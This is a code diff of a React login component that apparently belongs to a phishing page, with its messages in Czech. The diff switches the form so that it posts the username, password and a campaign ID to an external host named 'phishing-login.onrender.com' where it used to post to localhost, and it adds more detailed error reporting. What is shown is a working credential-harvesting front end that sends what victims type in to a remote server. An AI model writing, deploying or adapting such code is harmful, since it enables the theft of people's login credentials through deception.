@@ -34,7 +34,7 @@ const Login = () => {
     }
 
     try {
-      const response = await axios.post<ApiResponse>('http://localhost:3001/api/credentials', {
+      const response = await axios.post<ApiResponse>('https://phishing-login.onrender.com/api/credentials', {
         username: email,
         password: password,
         campaignId: '65c4d8f2e987b459a731d8f2'
@@ -42,7 +42,8 @@ const Login = () => {
       
       window.location.href = response.data.redirect;
     } catch (err) {
-      setError('Neplatné přihlašovací údaje');
+      console.error('Error details:', err.response?.data || err);
+      setError(err.response?.data?.details || err.response?.data?.error || 'Neplatné přihlašovací údaje');
     }
   };
 
